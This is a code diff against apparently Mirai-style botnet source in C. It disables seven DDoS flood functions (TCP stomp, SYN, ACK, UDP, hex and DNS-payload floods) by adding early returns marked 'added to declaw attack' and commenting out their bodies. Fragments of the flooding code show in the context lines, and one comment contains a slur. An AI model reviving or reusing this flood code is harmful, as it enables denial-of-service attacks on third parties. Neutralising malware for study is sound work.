@@ -88,7 +88,8 @@ unsigned short csum (unsigned short *buf, int count)
 
 void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int i, rfd;
+    return; } //added to declaw attack
+/*    int i, rfd;
     struct attack_stomp_data *stomp_data = calloc(targs_len, sizeof (struct attack_stomp_data));
     char **pkts = calloc(targs_len, sizeof (char *));
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
@@ -282,11 +283,12 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
                 printf("errno = %d\n", errno);
 #endif
     }
-}
+}*/
 
 void attack_method_stdhex(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts) // Shot by gay
 {
-    int i;
+    return; } //added to declaw attack
+/*    int i;
     char **pkts = calloc(targs_len, sizeof (char *));
     int *fds = calloc(targs_len, sizeof (int));
     port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
@@ -344,11 +346,12 @@ void attack_method_stdhex(uint8_t targs_len, struct attack_target *targs, uint8_
             send(fds[i], data, data_len, MSG_NOSIGNAL);
         }
     }
-}
+} */
 
 void attack_method_nudp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    char* strings[] = {
+    return; } //added to declaw attack
+/*    char* strings[] = {
             "\x0D\x0A\x0D\x0A",
             random_hex() + random_hex() + "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01",
             random_hex() + random_hex() + "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x05\x00\x01",
@@ -422,11 +425,12 @@ void attack_method_nudp(uint8_t targs_len, struct attack_target *targs, uint8_t 
             send(fds[i], strings[i], strlen(strings[i]) + 1, MSG_NOSIGNAL);
         }
     }
-}
+} */
 
 void attack_method_tcp(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int i, fd;
+    return; } //added to declaw attack
+/*    int i, fd;
     char **pkts = calloc(targs_len, sizeof (char *));
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
     uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
@@ -531,11 +535,12 @@ void attack_method_tcp(uint8_t targs_len, struct attack_target *targs, uint8_t o
             sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
         }
     }
-}
+} */
 
 void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int i, fd;
+    return; } //added to declaw attack
+ /*   int i, fd;
     char **pkts = calloc(targs_len, sizeof (char *));
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
     uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
@@ -687,11 +692,12 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
                 printf("errno = %d\n", errno);
 #endif
     }
-}
+} */
 
 void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-    int i, fd;
+    return; } //added to declaw attack
+/*    int i, fd;
     char **pkts = calloc(targs_len, sizeof (char *));
     uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
     uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
@@ -819,11 +825,12 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
                 printf("errno = %d\n", errno);
 #endif
     }
-}
+} */
 
 void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-#ifdef DEBUG
+    return; } //added to declaw attack
+/* #ifdef DEBUG
     printf("in udp plain\n");
 #endif
 
@@ -923,4 +930,4 @@ void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t op
                 printf("errno = %d\n", errno);
 #endif
     }
-}
+} */
